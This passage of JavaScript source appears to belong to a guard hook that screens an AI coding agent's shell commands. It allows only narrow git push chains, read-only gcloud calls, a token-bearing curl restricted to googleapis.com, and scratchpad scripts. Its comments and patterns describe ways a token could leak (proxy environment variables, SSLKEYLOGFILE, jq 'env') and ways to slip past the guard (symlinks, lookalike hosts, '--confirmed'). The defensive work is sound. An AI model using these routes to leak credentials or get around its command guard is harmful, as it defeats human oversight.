    const targetInfo = require('../companion/lib/identity.js').rawGitInfo(target);
    if (!targetInfo || !targetInfo.commonDir) return null;
    if (targetInfo.commonDir !== payloadCommonDir) return null;
    // Defensive sanity check (git-common-dir equality above is already the
    // security boundary): the target must itself resolve to a real toplevel.
    if (!targetInfo.toplevel) return null;
    try { fs.realpathSync(targetInfo.toplevel); } catch (_) { return null; }
    return target;
  } catch (_) {
    return null; // fail closed: unresolvable path, not a repo, etc.
  }
}

// currentBranchName(cwd) -> the checked-out branch name, or null (detached
// HEAD, not a repo, spawn failure/timeout — every failure mode reads as
// null, and the caller treats null as FAIL CLOSED, never as a pass).
function currentBranchName(cwd) {
  try {
    const { spawnSync } = require('child_process');
    const res = spawnSync('git', ['-C', cwd || process.cwd()].concat(T.gitBranchArgv), {
      encoding: 'utf8', timeout: T.gitTimeout,
    });
    if (!res || res.status !== 0) return null;
    const name = String(res.stdout || '').trim();
    return name || null;
  } catch (_) {
    return null;
  }
}

// configuredRemotes(cwd) -> array of `git -C <cwd> remote` names, or null
// on any failure (not a repo, spawn error/timeout) — the caller treats null
// as FAIL CLOSED.
function configuredRemotes(cwd) {
  try {
    const { spawnSync } = require('child_process');
    const res = spawnSync('git', ['-C', cwd || process.cwd(), 'remote'], { encoding: 'utf8', timeout: T.gitTimeout });
    if (!res || res.status !== 0) return null;
    return String(res.stdout || '').split('\n').map((l) => l.trim()).filter(Boolean);
  } catch (_) {
    return null;
  }
}

// isPlainPushRemoteAllowed(remote, cwd) -> bool. The remote token must be a
// CONFIGURED remote name — a path (`../other-repo`) or URL-ish token
// (`host/evil`) is a push destination git accepts directly and never
// qualifies. Unresolvable remotes fail closed.
function isPlainPushRemoteAllowed(remote, cwd) {
  if (!remote) return true;
  const remotes = configuredRemotes(cwd);
  if (!remotes) return false;
  return remotes.includes(remote);
}

// isPlainPushRefAllowed(ref, cwd) -> bool. No ref given, or `HEAD`, always
// qualifies; any other ref must equal the ACTUAL current branch — resolved
// fresh per call (never trusted from the command text itself).
function isPlainPushRefAllowed(ref, cwd) {
  if (!ref) return true;
  if (ref === 'HEAD') return true;
  const branch = currentBranchName(cwd);
  if (!branch) return false; // fail closed: could not resolve the current branch
  const colon = ref.indexOf(':');
  if (colon === -1) return ref === branch;
  // (d) `SRC:DST`: SRC is HEAD or the current branch, DST is the current
  // branch (bare or refs/heads/-qualified). Anything else never qualifies.
  const src = ref.slice(0, colon);
  const dst = ref.slice(colon + 1).replace(RX88, '');
  if (dst !== branch) return false;
  if (src === 'HEAD' || src === branch) return true;
  // SRC may also be the checked-out commit spelled as its (abbreviated) sha —
  // the same commit `HEAD` names, so the push is still "my current branch".
  // Resolved by git itself in the effective cwd (`rev-parse --verify --quiet
  // <src>^{commit}`), which applies git's own rule that a ref NAME wins over an
  // abbreviated sha: a tag/branch named like a sha on another commit resolves
  // to THAT commit, differs from HEAD and refuses. Ambiguous/unknown/any
  // resolve failure refuses.
  if (RX89.test(src)) {
    try {
      const { spawnSync } = require('child_process');
      const resolve = (rev) => {
        const res = spawnSync('git', ['-C', cwd || process.cwd(), 'rev-parse', '--verify', '--quiet', rev + '^{commit}'],
          { encoding: 'utf8', timeout: T.gitTimeout });
        return res && res.status === 0 ? String(res.stdout || '').trim().toLowerCase() : '';
      };
      const head = resolve('HEAD');
      return !!head && resolve(src) === head;
    } catch (_) { return false; }
  }
  return false;
}

// sinkPathHasSymlink(target, payload) -> true when the lexical target path, or
// any EXISTING component below the own scratchpad root, is a symlink (dangling
// included): a redirect through it writes wherever the link points, and
// realpath containment cannot see a dangling link. Not under a lexical own
// root -> true (refuse). A non-existing leaf in a real dir is fine.
function sinkPathHasSymlink(target, payload) {
  try {
    const base = (payload && typeof payload.cwd === 'string' && payload.cwd) || process.cwd();
    const abs = path.resolve(base, target.replace(/^['"]|['"]$/g, ''));
    const sp = require('./lib/scratchpad.js');
    const root = sp.ownScratchpadDirs(payload).find((r) => abs.startsWith(r + path.sep));
    if (!root) return true;
    let cur = root;
    for (const part of path.relative(root, abs).split(path.sep)) {
      cur = path.join(cur, part);
      let st;
      try { st = fs.lstatSync(cur); } catch (e) {
        if (e && e.code === 'ENOENT') return false; // rest does not exist yet
        return true;
      }
      if (st.isSymbolicLink()) return true;
    }
    return false;
  } catch (_) { return true; }
}

// isAllowedPlainPushChain(command, cwd) -> bool. See the header block above.
function isAllowedPlainPushChain(command, cwd, payload) {
  if (typeof command !== 'string' || !command.trim()) return false;
  // (e) strip ONE final own-scratchpad file redirect (keeping a trailing `2>&1`).
  // `[ \t]` (not `\s`): a newline before `>` makes it a SEPARATE command, so
  // a plain push, newline, then `> f` is not one push with a sink.
  const sink = command.match(RX90);
  if (sink && payload && isScratchpadOrTmpPath(sink[1], { payload, ownOnly: true }) &&
      !sinkPathHasSymlink(sink[1], payload)) {
    command = command.slice(0, sink.index) + sink[2];
  }
  const split = splitSegmentsDetailed(command);
  const segments = split.segments.slice();
  const delims = split.delims.slice();
  if (!segments.length) return false;
  // (d) ONE final `| tail -N` / `| head -N` output filter: drop it and treat
  // the segment it reads from as the end of the chain.
  if (segments.length >= 2 && delims[delims.length - 1] === 'end' && delims[delims.length - 2] === '|' &&
      PLAIN_OUTPUT_FILTER_RE.test(segments[segments.length - 1].trim())) {
    segments.pop();
    delims.pop();
    delims[delims.length - 1] = 'end';
  }
  // (d2) a `| tail/head -N` output filter piped from a PLAIN PUSH segment in
  // the MIDDLE of the chain (`git push origin b 2>&1 | tail -3; git ls-remote …`):
  // drop the filter and let the push segment carry the following delimiter.
  for (let i = segments.length - 2; i >= 0; i--) {
    if (delims[i] !== '|' || !PLAIN_OUTPUT_FILTER_RE.test(segments[i + 1].trim())) continue;
    const prev = classifyPlainGitChainSegment(segments[i].trim());
    if (!prev || prev.kind !== 'push') continue;
    segments.splice(i + 1, 1);
    delims.splice(i, 1);
  }
  // Every delimiter between segments must be '&&' or ';' — a pipe, '||',
  // background '&', newline, heredoc, subshell/group, or command
  // substitution boundary disqualifies the WHOLE chain. The final delimiter
  // must be 'end' (nothing trails the last segment).
  for (let i = 0; i < delims.length; i++) {
    const isLast = i === delims.length - 1;
    if (isLast) {
      if (delims[i] !== 'end') return false;
    } else if (delims[i] !== '&&' && delims[i] !== ';') {
      return false;
    }
  }
  let rest = segments;
  // (b) ONE optional leading `cd <path>` — only the FIRST segment may be a
  // cd, and only when it resolves (realpath) to the payload cwd's own repo
  // toplevel or a directory inside it. All git resolution below then uses
  // that resolved directory. Fails CLOSED (whole chain disqualified) on any
  // other cd shape or an unresolvable/out-of-repo target.
  let gitCwd = cwd;
  const firstTrimmed = segments.length ? segments[0].trim() : '';
  if (firstTrimmed && RX91.test(firstTrimmed)) {
    const rawPath = classifyLeadingCdSegment(firstTrimmed);
    if (!rawPath) return false;
    const resolved = resolvedLeadingCdTarget(rawPath, cwd);
    if (!resolved) return false;
    gitCwd = resolved;
    rest = segments.slice(1);
    if (!rest.length) return false; // a bare `cd <dir>` alone is not a push chain
  }
  let sawPush = false;
  for (const seg of rest) {
    const trimmed = seg.trim();
    if (!trimmed) continue;
    const cls = classifyPlainGitChainSegment(trimmed);
    if (!cls) return false; // any other segment disqualifies the whole chain
    if (cls.kind === 'push') {
      if (!isPlainPushRemoteAllowed(cls.remote, gitCwd)) return false;
      if (!isPlainPushRefAllowed(cls.ref, gitCwd)) return false;
      sawPush = true;
    }
    // (c) trailing read-only segments (log/status/show) are only ever
    // meaningful AFTER a push has already appeared in this chain — before
    // that, `git status`/`git log`/`git show` were never part of the
    // original allowance and must not silently start qualifying.
    if ((cls.kind === 'log' || cls.kind === 'status' || cls.kind === 'show' ||
         cls.kind === 'lsremote' || cls.kind === 'revparse') && !sawPush) return false;
    if (cls.kind === 'lsremote' && !isPlainPushRemoteAllowed(cls.remote, gitCwd)) return false;
  }
  return true;
}

// ---------------------------------------------------------------------------
// Narrow read-only gcloud (owner-approved 2026-09-26). In the MAIN THREAD
// ONLY (checked after the isCoordinator gate in main()), three shapes run
// inline even though `gcloud` is a HEAVY_VERB:
//   A. `gcloud auth print-access-token` — the whole command, nothing else.
//   B. `gcloud <group…> <describe|list|get-iam-policy|read> … --format=
//      json|yaml|value(...)`, optionally piped into a bounded sink or jq.
//   C. `T=$(gcloud auth print-access-token); curl -s|-sS [-H "Authorization:
//      Bearer $T"] <https URL>` (`;` or `&&`), GET only, output piped into a
//      bounded sink / jq or capped with --max-filesize.
// Everything else stays blocked: other gcloud verbs, curl with -X other than
// GET, -d/--data*/-F/-T/--upload-file/-o/-O/--output (every flag outside a
// short allowlist is refused), `@file`, and any extra chained segment.
// Reuses splitSegmentsDetailed/tokenizeQuoted/effectiveVerb/
// isBoundedSinkSegment/hasUnquotedRedirectChar/hasShellExpansionAnywhere —
// no new parser. Gated by guards.allowGcloudReads (default true).
// ---------------------------------------------------------------------------

const GCLOUD_FORMAT_RE = /^(?:json|yaml|value\(.+\))$/;
// jq builtins that read the environment, other inputs/files or source
// locations (0.113 P3): `env`/`$ENV` expose every env var, `input(s)` and
// `input_filename` reach beyond the piped JSON, `import`/`include` load
// modules from disk.
const JQ_REFUSED_FILTER_RE = /\$ENV|\$__loc__|(^|[^A-Za-z0-9_$])(?:env|input|inputs|input_filename|import|include)(?![A-Za-z0-9_])/;
// A pipe-fed tail segment for shapes B and C: a bounded sink (tail/head/wc/
// grep -c/grep -m N) or `jq` with only formatting flags and one filter. No
// redirect or expansion of any kind.
function isGcloudReadSinkSegment(segment) {
  if (hasUnquotedRedirectChar(segment) || hasShellExpansionAnywhere(segment)) return false;
  const tokens = tokenizeQuoted(segment);
  if (!tokens.length) return false;
  if (tokens[0] === 'jq') {
    let filters = 0;
    for (const t of tokens.slice(1)) {
      if (t.startsWith('-')) { if (!T.jqSafe.has(t)) return false; continue; }
      if (JQ_REFUSED_FILTER_RE.test(t)) return false;
      filters++;
    }
    return filters <= 1;
  }
  if (!T.gcloudSinkVerbs.has(tokens[0])) return false;
  // grep -f/--file reads its patterns from a FILE, and its match output then
  // echoes that file's content — refuse it (and any short cluster with f).
  if (tokens[0] === 'grep' && tokens.some((t) => RX92.test(t) || RX93.test(t))) return false;
  return isBoundedSinkSegment(segment);
}

// Shape B (and the literal shape A): one `gcloud` segment.
function isGcloudReadSegment(rawSegment) {
  const segment = stripGcloudStderrMerge(rawSegment); // the one accepted redirection
  if (hasUnquotedRedirectChar(segment) || hasShellExpansionAnywhere(segment)) return false;
  const tokens = tokenizeQuoted(segment);
  if (tokens[0] !== 'gcloud') return false; // no env prefix, no wrapper
  const rest = tokens.slice(1);
  if (rest.length === 2 && rest[0] === 'auth' && rest[1] === 'print-access-token') return 'token';
  const g = gcloudReadGrammar(rest, T.gcloudReadVerbs);
  if (!g) return false;
  // `read` is a gcloud verb only under `logging` (`gcloud [beta] logging read`);
  // anywhere else the word is a resource name posing as the verb.
  if (g.verb === 'read' && g.path[g.path.length - 1] !== 'logging') return false;
  const formats = g.flags.filter((f) => f.startsWith('--format='));
  if (formats.length !== 1 || !GCLOUD_FORMAT_RE.test(formats[0].slice(9))) return false;
  return 'read';
}

// Shape C's curl segment. `tokenVar` is the variable the token was assigned
// to; `$T`/`${T}` may appear ONLY as `Authorization: Bearer $T`.
// The token may only ever reach Google: the URL's PARSED host must be
// googleapis.com or a subdomain of it — no userinfo, no IP literal, no other
// host. Redirect-following (-L), --resolve/--connect-to, proxies (-x),
// --url and -K/--config are refused by the flag allowlist below (every flag
// not listed is refused).
const GOOGLEAPIS_HOST_RE = /(^|\.)googleapis\.com$/;
function isGoogleApisHttpsUrl(raw) {
  // The RAW host text must already be plain ASCII and identical to what the
  // URL parser yields — no percent-encoding, IDN/full-width lookalikes or
  // curl URL globbing ({a,b} / [1-2]) that curl could expand differently.
  if (RX94.test(raw)) return false;
  const rawHost = (raw.match(RX95) || [])[1] || '';
  if (!RX96.test(rawHost)) return false;
  // `new URL(raw)` is not available here: an IDNA label is validated by the URL parser in ways this check does not reproduce, and
  // a port that is not empty digits up to the maximum makes the parser throw
  if (rawHost.split('.').some((l) => l.length >= 4 && l.slice(0, 4).toLowerCase() === 'xn--')) unsure();
  const afterHost = raw.slice('https://'.length + rawHost.length);
  if (afterHost.charAt(0) === ':') {
    const pm = RX97.exec(afterHost);
    const port = pm ? pm[1] : '';
    if (!RX98.test(port) || (port !== '' && port.replace(RX99, '').length > ah.cfgNum('command.port_digits_max')) || Number(port) > ah.cfgNum('command.port_max')) return false;
  }
  const u = { hostname: rawHost.toLowerCase(), protocol: 'https:', username: '', password: '' };
  if (u.hostname.toLowerCase() !== rawHost.toLowerCase()) return false;
  if (u.protocol !== 'https:') return false;
  if (u.username || u.password || raw.includes('@')) return false;
  const host = u.hostname.toLowerCase();
  if (!host || host.startsWith('[') || RX100.test(host)) return false; // IP literal
  return GOOGLEAPIS_HOST_RE.test(host);
}

const CURL_SHORT_FLAG_RE = /^-[sSf]+$/;
function curlSegmentShape(segment, tokenVar) {
  if (hasUnquotedRedirectChar(segment)) return null;
  if (hasSubstitutionOutsideSingleQuotes(segment) || RX101.test(segment)) return null;
  const tv = tokenVar.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const tokenRefRe = new RegExp('\\$(?:\\{' + tv + '\\}|' + tv + '(?![A-Za-z0-9_]))', 'g');
  const tokens = tokenizeQuoted(segment);
  if (tokens[0] !== 'curl') return null;
  let silent = false;
  let url = null;
  let maxFilesize = false;
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i];
    if (CURL_SHORT_FLAG_RE.test(t)) { if (t.includes('s')) silent = true; continue; }
    if (T.curlBare.has(t)) { if (t === '--silent') silent = true; continue; }
    if (t === '-X' || t === '--request') { if (tokens[i + 1] !== 'GET') return null; i++; continue; }
    if (t === '-XGET' || t === '--request=GET') continue;
    if (t === '--max-filesize' || t === '--max-time' || t === '-m') {
      if (!RX42.test(tokens[i + 1] || '')) return null;
      if (t === '--max-filesize') maxFilesize = true;
      i++; continue;
    }
    if (t === '-H' || t === '--header') {
      const h = tokens[i + 1];
      if (typeof h !== 'string' || !h || h.startsWith('@')) return null;
      const stripped = h.replace(tokenRefRe, '');
      if (RX102.test(stripped)) return null;
      if (stripped !== h && !new RegExp('^Authorization:\\s*Bearer\\s+\\$(?:\\{' + tv + '\\}|' + tv + ')$', 'i').test(h)) return null;
      i++; continue;
    }
    if (t.startsWith('-')) return null; // every other flag (-d/-F/-T/-o/-O/-K/--data*…) is refused
    if (url !== null) return null;
    if (!RX103.test(t)) return null;
    if (!isGoogleApisHttpsUrl(t)) return null;
    url = t;
  }
  if (!silent || !url) return null;
  // `$` anywhere outside the allowed header reference is refused.
  if (RX104.test(segment.replace(tokenRefRe, ''))) return null;
  return { maxFilesize };
}

const GCLOUD_TOKEN_PREFIX_RE = /^\s*([A-Za-z_][A-Za-z0-9_]*)=\$\(\s*gcloud\s+auth\s+print-access-token\s*\)\s*(?:;|&&)\s*/;
// The token variable is one of a closed set of names (0.113 P2): any other
// name could be an env var curl itself reads (HTTPS_PROXY, http_proxy,
// CURL_CA_BUNDLE, SSLKEYLOGFILE, …) and hand the token to a proxy or a file.
const GCLOUD_TOKEN_VAR_ALLOWED_RE = /^(T|TOKEN|ACCESS_TOKEN|GCLOUD_TOKEN)$/;

// isAllowedGcloudReadCommand(command) -> bool. See the header block above.
function isAllowedGcloudReadCommand(command) {
  if (typeof command !== 'string' || !command.trim()) return false;
  if (RX82.test(neutralizeQuotedContents(command))) return false; // a comment can hide a segment
  const prefix = command.match(GCLOUD_TOKEN_PREFIX_RE);
  if (prefix) {
    const tokenVar = prefix[1];
    if (!GCLOUD_TOKEN_VAR_ALLOWED_RE.test(tokenVar)) return false;
    const rest = command.slice(prefix[0].length);
    const { segments, delims } = splitSegmentsDetailed(rest);
    if (!segments.length || delims[delims.length - 1] !== 'end') return false;
    const shape = curlSegmentShape(segments[0], tokenVar);
    if (!shape) return false;
    for (let i = 0; i < delims.length - 1; i++) if (delims[i] !== '|') return false;
    for (let i = 1; i < segments.length; i++) if (!isGcloudReadSinkSegment(segments[i])) return false;
    return segments.length > 1 || shape.maxFilesize; // output piped or bounded
  }
  const { segments, delims } = splitSegmentsDetailed(command);
  if (!segments.length || delims[delims.length - 1] !== 'end') return false;
  const kind = isGcloudReadSegment(segments[0]);
  if (!kind) return false;
  if (kind === 'token') return segments.length === 1;
  for (let i = 0; i < delims.length - 1; i++) if (delims[i] !== '|') return false;
  for (let i = 1; i < segments.length; i++) if (!isGcloudReadSinkSegment(segments[i])) return false;
  return true;
}

// One `<python3|node|sh|bash> <script file> [args…]` segment, script inside
// the scratchpad/tmp (realpath'd), no --confirmed, not an anti-hall plugin script.
function isBackgroundScratchScriptSegment(segment, ctx) {
  const tokens = tokenizeQuoted(segment.replace(/\d*>>?\s*\S+/g, ' '));
  // Direct exec (shebang + exec bit): argv[0] is itself the script. Stricter
  // than the interpreter form: OWN scratchpad only (never a generic tmp root),
  // every component lstat'd (no symlinks), regular executable file. A leading
  // `VAR=…` token is not a path, so env-prefix assignments stay refused.
  const direct = tokens.length >= 1 && tokens[0].includes('/') && !T.bgInterpreters.has(tokens[0]);
  if (!direct && (tokens.length < 2 || !T.bgInterpreters.has(tokens[0]))) return false;
  let scriptIdx = direct ? 0 : 1;
  if (!direct) {
    const safe = Object.prototype.hasOwnProperty.call(T.bgSafeFlags, tokens[0]) ? T.bgSafeFlags[tokens[0]] : undefined;
    while (safe && scriptIdx < tokens.length && safe.has(tokens[scriptIdx])) scriptIdx++;
  }
  const script = tokens[scriptIdx];
  if (!script || script.startsWith('-')) return false;
  if (!isScratchpadOrTmpPath(script, direct ? Object.assign({ ownOnly: true }, ctx) : ctx)) return false;
  const payload = ctx.payload;
  if (direct && sinkPathHasSymlink(script, payload)) return false;
  const base = (typeof payload.cwd === 'string' && payload.cwd) || process.cwd();
  let realScript;
  try {
    // Joined WITHOUT lexical normalization, then realpath'd: the kernel resolves
    // `L/../x` through the symlink L, so path.resolve's textual `..` collapse
    // would point at a different file than the one that actually runs.
    const joined = path.isAbsolute(script) ? script : base.replace(RX8, '') + '/' + script;
    realScript = fs.realpathSync.native(joined); // .native: libc realpath keeps `L/..` physical (JS realpathSync pre-normalizes `..`)
    const st = fs.statSync(realScript);
    if (!st.isFile()) return false;
    if (direct && (st.mode & 0o111) === 0) return false;
  } catch (_) { return false; }
  // Mirrors the 0.112 F1 rule of the script-check carve-out: never a way to
  // flip a safety switch or trust an allowlist from the main thread —
  // `--confirmed` anywhere refuses, and so does any script inside an
  // anti-hall plugin root (this install, a cache copy, a dev checkout).
  if (tokens.some((t) => t === '--confirmed' || t.startsWith('--confirmed='))) return false;
  if (isInsideAntiHallPlugin(realScript)) return false;
  return true;
}

// The command is one or more segments joined by `;`/`&&`/`|`, each either a
// scratch-script segment or a bounded read sink (tail/head/wc/grep -c|-m N) —
// the exact remedy shape the block text suggests (`script > out; wc -l out`).
// At least one scratch-script segment is required; anything else refuses.
function isBackgroundScratchScript(command, payload) {
  if (!payload || !payload.tool_input || payload.tool_input.run_in_background !== true) return false;
  if (typeof command !== 'string' || !command.trim()) return false;
  if (RX82.test(neutralizeQuotedContents(command))) return false;
  if (hasShellExpansionAnywhere(command)) return false;
  const neutralized = neutralizeQuotedContents(command);
  if (RX31.test(neutralized)) return false;
  const ctx = { payload };
  if (hasDisallowedWriteRedirect(command, ctx)) return false;
  const { segments, delims } = splitSegmentsDetailed(command);
  if (!segments.length) return false;
  let sawScript = false;
  for (let i = 0; i < segments.length; i++) {
    if (!T.bgDelims.has(delims[i])) return false;
    const seg = segments[i].trim();
    if (!seg) return false;
    if (isBackgroundScratchScriptSegment(seg, ctx)) sawScript = true;
    else if (!isBoundedSinkSegment(seg) && !isScratchFileSinkSegment(seg, ctx)) return false;
  }
  return sawScript;
}

// ---------------------------------------------------------------------------
// WORK classifier (coordinator drift) + Bash edit parity (F3).
// classifyBashWork(command, payload, opts) -> { work, blockable, labels, editBlocks }.
// opts.editOnly (F3) skips the script-run and inline-code probes.
// WORK = a state-changing git segment, a gh mutation, or a Bash write into a
// non-notes repo file. Recovery git commands are WORK but never blockable.
// editBlocks = Bash write targets edit-guard's own verdict would block for
// the Edit tool (main() blocks on them; git segments never land here).
// ---------------------------------------------------------------------------

const GIT_TAG_LIST_RE = /^(?:-l|--list|-n\d*|--contains|--no-contains|--points-at|--merged|--no-merged|-v|--verify)(?:=|$)/;
// gitSubAndArgs(segment) -> { sub, args } for a real git invocation, else null.
function gitSubAndArgs(segment) {
  if (effectiveVerb(segment) !== 'git') return null;
  const tokens = tokenizeQuoted(segment);
  const gitIdx = tokens.findIndex((t) => basename(t).toLowerCase() === 'git');
  if (gitIdx === -1) return null;
  const subIdx = gitSubcommandIndex(tokens, gitIdx);
  if (subIdx === -1) return null;
  return { sub: tokens[subIdx].toLowerCase(), args: tokens.slice(subIdx + 1) };
}

function isStateChangingGitSegment(segment) {
  const g = gitSubAndArgs(segment);
  if (!g) return false;
  const { sub, args } = g;
  const has = (re) => args.some((t) => re.test(t));
  if (T.gitAlwaysWork.has(sub)) return true;
  if (sub === 'clean') return !has(RX105);
  if (sub === 'stash') return !['list', 'show'].includes((args[0] || '').toLowerCase());
  if (sub === 'apply') return has(RX106) || !has(RX107);
  if (sub === 'switch') return has(RX108) || has(RX109);
  if (sub === 'checkout') return args.includes('--') || has(RX110) || has(RX111);
  if (sub === 'branch') return has(RX112);
  if (sub === 'tag') {
    if (has(RX113)) return true;
    if (has(GIT_TAG_LIST_RE)) return false;
    for (let i = 0; i < args.length; i++) {
      const t = args[i];
      if (T.gitTagValue.has(t)) { i++; continue; }
      if (!t.startsWith('-')) return true; // a tag name: create
    }
    return false; // bare `git tag` (or flags only) lists
  }
  return false;
}

// Recovery (Decision 4): counted as WORK, never blockable. `git am --skip` is not recovery.
function isRecoveryGitSegment(segment) {
  const g = gitSubAndArgs(segment);
  if (!g) return false;
  const { sub, args } = g;
  if (['am', 'rebase', 'cherry-pick', 'revert'].includes(sub)) return args.includes('--abort') || args.includes('--quit');
  if (sub === 'merge') return args.includes('--abort');
  if (sub === 'stash') return ['pop', 'apply'].includes((args[0] || '').toLowerCase());
  return false;
}

// maskProcessSubstitutions(cmd) -> { text, inners }: `>(…)`/`<(…)` spans are
// blanked so the splitter (which cuts at `(`) keeps `tee >(grep x) out.txt`
// as one segment; the inner commands are returned for recursion, the same way
// `$(…)` substitutions are. Quote- and heredoc-aware.
function maskProcessSubstitutions(cmd) {
  const r = cmdMemo('mps:' + cmd, function () { return maskProcessSubstitutionsRaw(cmd); });
  return { text: r.text, inners: r.inners.slice() }; // the callers rewrite `text`
}
function maskProcessSubstitutionsRaw(cmd) {
  const inners = [];
  let out = '';
  let i = 0;
  let q = '';
  const n = cmd.length;
  while (i < n) {
    const c = cmd[i];
    if (q) {
      if (c === '\\' && q === '"' && i + 1 < n) { out += c + cmd[i + 1]; i += 2; continue; }
      out += c; if (c === q) q = ''; i++; continue;
    }
    if (c === '\\' && i + 1 < n) { out += c + cmd[i + 1]; i += 2; continue; }
    if (c === "'" || c === '"') { q = c; out += c; i++; continue; }
    if (c === '<' && cmd[i + 1] === '<') {
      const h = parseHeredocAt(cmd, i);
      if (h) { out += cmd.slice(i, h.end); i = h.end; continue; }
    }
    if ((c === '<' || c === '>') && cmd[i + 1] === '(') {
      let j = i + 2;
      let depth = 1;
      let qq = '';
      for (; j < n && depth; j++) {
        const d = cmd[j];
        if (qq) { if (d === qq) qq = ''; continue; }
        if (d === "'" || d === '"') qq = d;
        else if (d === '(') depth++;
        else if (d === ')') depth--;
      }
      inners.push(cmd.slice(i + 2, depth ? j : j - 1));
      out += ' ';
      i = j;
      continue;
    }
    out += c; i++;
  }
  return { text: out, inners };
}

// readRedirectTarget(s, i) -> the dequoted shell word starting at i (after
// blanks), or null when it is an fd-dup/process target (`&…`, `(…`) or empty.
function readRedirectTarget(s, i) {
  while (i < s.length && (s[i] === ' ' || s[i] === '\t')) i++;
  if (i >= s.length || s[i] === '&' || s[i] === '(') return null;
  let out = '';
  let q = '';
  for (; i < s.length; i++) {
    const c = s[i];
    if (q) { if (c === q) q = ''; else out += c; continue; }
    if (c === "'" || c === '"') { q = c; continue; }
    if (c === '\\' && i + 1 < s.length) { out += s[i + 1]; i++; continue; }
    if (RX30.test(c) || RX114.test(c)) break;
    out += c;
  }
  return out || null;
}

function blankTestOperators(text) {
  return cmdMemo('bto:' + text, function () { return blankTestOperatorsRaw(text); });
}
function blankTestOperatorsRaw(text) {
  if (!RX115.test(text) || !RX116.test(text)) return text;
  const n = text.length;
  // 'A' $(( )), 'a' (( )), 'b' [[ ]], 'g' group inside a test, 'p' command
  const stack = [];
  const top = () => stack[stack.length - 1];
  const testCtx = () => { const t = top(); return t === 'A' || t === 'a' || t === 'b' || t === 'g'; };
  const cmdPos = (i) => {
    let j = i - 1;
    while (j >= 0 && (text[j] === ' ' || text[j] === '\t')) j--;
    if (j < 0 || RX117.test(text[j])) return true;
    let k = j;
    while (k >= 0 && RX118.test(text[k])) k--;
    if (!T.testKeywords.has(text.slice(k + 1, j + 1))) return false;
    while (k >= 0 && (text[k] === ' ' || text[k] === '\t')) k--;
    return k < 0 || RX117.test(text[k]);
  };
  const drop = (kinds) => { while (stack.length && kinds.includes(top())) stack.pop(); };
  let out = '';
  let i = 0;
  let q = '';
  while (i < n) {
    const c = text[i];
    const c2 = text[i + 1];
    if (q) {
      if (c === '\\' && q === '"' && i + 1 < n) { out += c + c2; i += 2; continue; }
      out += c; if (c === q) q = ''; i++; continue;
    }
    if (c === '\\' && i + 1 < n) { out += c + c2; i += 2; continue; }
    if (c === '$' && c2 === "'") {
      let j = i + 2;
      while (j < n && text[j] !== "'") j += text[j] === '\\' ? 2 : 1;
      j = Math.min(j + 1, n);
      out += text.slice(i, j); i = j; continue;
    }
    if (c === "'" || c === '"') { q = c; out += c; i++; continue; }
    if (c === '<' && c2 === '<' && !testCtx()) {
      const h = parseHeredocAt(text, i);
      if (h) { out += text.slice(i, h.end); i = h.end; continue; }
    }
    if (c === ';' || c === '\n') drop(['a', 'b', 'g']);
    else if ((c === '&' || c === '|') && c2 !== c && text[i - 1] !== c) drop(['b', 'g']);
    if (c === '$' && c2 === '(' && text[i + 2] === '(') { stack.push('A'); out += '$(('; i += 3; continue; }
    if (c === '$' && c2 === '(') { stack.push('p'); out += '$('; i += 2; continue; }
    if (c === '(' && c2 === '(' && !testCtx() && cmdPos(i)) { stack.push('a'); out += '(('; i += 2; continue; }
    if (c === '(') { stack.push(testCtx() ? 'g' : 'p'); out += c; i++; continue; }
    if (c === ')') {
      if ((top() === 'a' || top() === 'A') && c2 === ')') { stack.pop(); out += '))'; i += 2; continue; }
      if (stack.length) stack.pop();
      out += c; i++; continue;
    }
    if (c === '[' && c2 === '[' && !testCtx() && cmdPos(i) && RX30.test(text[i + 2] || '')) { stack.push('b'); out += '[['; i += 2; continue; }
    if (c === ']' && c2 === ']' && top() === 'b' && RX119.test(text[i + 2] || '')) { stack.pop(); out += ']]'; i += 2; continue; }
    out += (c === '<' || c === '>') && testCtx() ? ' ' : c;
    i++;
  }
  return out;
}

const REDIRECT_TOKEN_RE = /^\d*(?:&?>>?|>\||<)/;
const BARE_REDIRECT_TOKEN_RE = /^\d*(?:&?>>?|>\||<+)$/;

// bashWriteTargets(segment, cwd?) -> raw (dequoted) paths ONE segment writes:
// `>`/`>>`/`&>`/`>|` redirects, tee args, sed -i / perl -i files, and cp/mv
// destinations (mv also its sources). cwd (default process.cwd()) only
// resolves whether a cp/mv destination is an existing directory.
function bashWriteTargets(segment, cwd, superset) {
  const out = [];
  if (typeof segment !== 'string' || !segment.trim()) return out;
  const keep = (t) => {
    if (!t || t.startsWith('&') || t.startsWith('(') || t.includes('>') || RX120.test(t)) return;
    out.push(t);
  };
  // (a) redirects: operators found on the quote-neutralized text (test /
  // arithmetic comparisons blanked), targets read from the original. A `\>`
  // (odd run of backslashes before it) is a literal `>`, not a redirect.
  const neutral = blankTestOperators(neutralizeQuotedContents(segment));
  const re = /(^|[^<>&])(>\||&?>>?)/g;
  let m;
  while ((m = re.exec(neutral))) {
    const op = m.index + m[1].length;
    let bs = 0;
    while (op - 1 - bs >= 0 && neutral[op - 1 - bs] === '\\') bs++;
    if (bs % 2) continue;
    keep(readRedirectTarget(segment, op + m[2].length));
  }

  // (b) argv without redirect tokens (and the word after a bare operator).
  const raw = tokenizeQuoted(segment);
  const toks = [];
  for (let i = 0; i < raw.length; i++) {
    if (raw[i] !== '' && REDIRECT_TOKEN_RE.test(raw[i])) { if (BARE_REDIRECT_TOKEN_RE.test(raw[i])) i++; continue; }
    toks.push(raw[i]);
  }
  const verb = effectiveVerb(segment);
  const vi = toks.findIndex((t) => basename(t).toLowerCase() === verb);
  if (!verb || vi === -1) return out;
  const rest = toks.slice(vi + 1);

  if (verb === 'tee') { // (c)
    for (const t of rest) if (!t.startsWith('-')) keep(t);
  } else if (verb === 'sed') { // (d)
    let inPlace = false;
    let scriptOpt = false;
    const pos = [];
    for (let i = 0; i < rest.length; i++) {
      const t = rest[i];
      if (t === '--') { pos.push(...rest.slice(i + 1)); break; }
      if (t === '-i') { inPlace = true; if (rest[i + 1] === '') i++; continue; } // '' = macOS suffix
      if (t === '-e' || t === '-f' || t === '--expression' || t === '--file') { scriptOpt = true; i++; continue; }
      if (RX121.test(t)) { scriptOpt = true; continue; }
      if (RX122.test(t)) { inPlace = true; continue; }
      if (t.startsWith('--')) continue;
      if (RX123.test(t)) {
        for (let k = 1; k < t.length; k++) {
          const ch = t[k];
          if (ch === 'i') { inPlace = true; break; } // rest of the cluster is the suffix
          if (ch === 'e' || ch === 'f') { scriptOpt = true; if (k === t.length - 1) i++; break; }
